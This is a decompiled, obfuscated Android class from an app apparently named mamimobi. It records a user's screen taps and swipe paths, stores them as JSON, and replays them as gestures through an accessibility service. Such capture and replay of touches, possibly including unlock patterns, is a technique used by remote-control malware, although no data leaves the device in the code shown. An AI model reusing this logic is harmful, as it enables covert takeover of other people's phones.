package defpackage;

import android.accessibilityservice.GestureDescription;
import android.content.Context;
import android.graphics.Path;
import android.os.Handler;
import android.os.Looper;
import android.os.SystemClock;
import android.text.TextUtils;
import com.mamimobi.AccessService;
import com.mamimobi.videostream.model.ScreenPoints;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.concurrent.atomic.AtomicInteger;
import org.json.JSONArray;

/* JADX INFO: loaded from: classes.dex */
public abstract class sa0 {
    public static final ArrayList a = new ArrayList();
    public static final ArrayList b = new ArrayList();

    public static synchronized void a(float f, float f2) {
        if (AccessService.m0.get()) {
            return;
        }
        try {
            ArrayList arrayList = a;
            if (!arrayList.isEmpty()) {
                ScreenPoints screenPoints = (ScreenPoints) arrayList.get(arrayList.size() - 1);
                if (Math.hypot(f - screenPoints.x, f2 - screenPoints.y) < 10.0d) {
                    return;
                }
            }
            ScreenPoints screenPoints2 = new ScreenPoints();
            screenPoints2.x = f;
            screenPoints2.y = f2;
            arrayList.add(screenPoints2);
        } catch (Exception unused) {
        }
    }

    public static synchronized void b(String str, float f, float f2) {
        try {
            if (AccessService.m0.get()) {
                return;
            }
            ArrayList arrayList = b;
            if (!arrayList.isEmpty()) {
                ScreenPoints screenPoints = (ScreenPoints) arrayList.get(arrayList.size() - 1);
                if (Math.hypot(f - screenPoints.x, f2 - screenPoints.y) < 6.0d) {
                    return;
                }
            }
            ScreenPoints screenPoints2 = new ScreenPoints();
            screenPoints2.x = f;
            screenPoints2.y = f2;
            screenPoints2.action = str;
            arrayList.add(screenPoints2);
        } catch (Exception unused) {
        }
    }

    public static synchronized void c(Context context) {
        ArrayList arrayList;
        ArrayList arrayList2 = a;
        if (arrayList2.isEmpty()) {
            return;
        }
        try {
            try {
                JSONArray jSONArray = new JSONArray();
                Iterator it = arrayList2.iterator();
                while (it.hasNext()) {
                    jSONArray.put(AccessService.h0.f((ScreenPoints) it.next()));
                }
                fa0.Q0(context, "CLICK", jSONArray.toString());
                arrayList = a;
            } catch (Exception e) {
                e.printStackTrace();
                arrayList = a;
            }
            arrayList.clear();
        } catch (Throwable th) {
            a.clear();
            throw th;
        }
    }

    public static synchronized void d(AccessService accessService) {
        ArrayList arrayList;
        ArrayList arrayList2 = a;
        if (arrayList2.isEmpty()) {
            return;
        }
        try {
            try {
                JSONArray jSONArray = new JSONArray();
                Iterator it = arrayList2.iterator();
                while (it.hasNext()) {
                    jSONArray.put(AccessService.h0.f((ScreenPoints) it.next()));
                }
                fa0.Q0(accessService, "MIXCLICK", jSONArray.toString());
                arrayList = a;
            } catch (Exception e) {
                e.printStackTrace();
                arrayList = a;
            }
            arrayList.clear();
        } catch (Throwable th) {
            a.clear();
            throw th;
        }
    }

    public static synchronized void e(Context context) {
        ArrayList arrayList;
        ArrayList arrayList2;
        try {
            try {
                arrayList2 = b;
            } catch (Exception e) {
                e.printStackTrace();
                arrayList = b;
            }
            if (arrayList2.isEmpty()) {
                arrayList2.clear();
                return;
            }
            JSONArray jSONArray = new JSONArray();
            Iterator it = arrayList2.iterator();
            while (it.hasNext()) {
                jSONArray.put(AccessService.h0.f((ScreenPoints) it.next()));
            }
            fa0.Q0(context, "PATH", jSONArray.toString());
            arrayList = b;
            arrayList.clear();
        } catch (Throwable th) {
            b.clear();
            throw th;
        }
    }

    public static synchronized void f(AccessService accessService) {
        try {
            try {
                AtomicInteger atomicInteger = AccessService.C0;
                int i = 0;
                if (atomicInteger.get() == 3) {
                    String strQ0 = fa0.q0(accessService, "PATH", "");
                    if (!TextUtils.isEmpty(strQ0) && !strQ0.equals("[]")) {
                        AccessService.n0.set(true);
                        JSONArray jSONArray = new JSONArray(strQ0);
                        Path path = new Path();
                        while (i < jSONArray.length()) {
                            ScreenPoints screenPoints = (ScreenPoints) AccessService.h0.b(ScreenPoints.class, jSONArray.getString(i));
                            if ("d".equals(screenPoints.action)) {
                                path.moveTo(screenPoints.x, screenPoints.y);
                            } else {
                                path.lineTo(screenPoints.x, screenPoints.y);
                            }
                            i++;
                        }
                        AccessService.e0.dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path, 0L, 350L)).build(), null, null);
                        new Handler(Looper.getMainLooper()).postDelayed(new k1(accessService, 5), 5000L);
                    }
                } else if (atomicInteger.get() == 1) {
                    String strQ02 = fa0.q0(accessService, "CLICK", "");
                    if (!TextUtils.isEmpty(strQ02) && !strQ02.equals("[]")) {
                        JSONArray jSONArray2 = new JSONArray(strQ02);
                        while (i < jSONArray2.length()) {
                            ScreenPoints screenPoints2 = (ScreenPoints) AccessService.h0.b(ScreenPoints.class, jSONArray2.getString(i));
                            d91.b(AccessService.e0, screenPoints2.x, screenPoints2.y);
                            SystemClock.sleep(1000L);
                            i++;
                        }
                        new Handler(Looper.getMainLooper()).postDelayed(new k1(accessService, 6), 5000L);
                    }
                } else if (atomicInteger.get() == 2) {
                    String strQ03 = fa0.q0(accessService, "MIXCLICK", "");
                    if (!TextUtils.isEmpty(strQ03) && !strQ03.equals("[]")) {
                        JSONArray jSONArray3 = new JSONArray(strQ03);
                        while (i < jSONArray3.length()) {
                            ScreenPoints screenPoints3 = (ScreenPoints) AccessService.h0.b(ScreenPoints.class, jSONArray3.getString(i));
                            d91.b(AccessService.e0, screenPoints3.x, screenPoints3.y);
                            SystemClock.sleep(1000L);
                            i++;
                        }
                        new Handler(Looper.getMainLooper()).postDelayed(new k1(accessService, 7), 5000L);
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
                if (AccessService.C0.get() == 3) {
                    fa0.Q0(accessService, "PATH", "");
                } else {
                    fa0.Q0(accessService, "CLICK", "");
                }
            }
        } catch (Throwable th) {
            throw th;
        }
    }
}
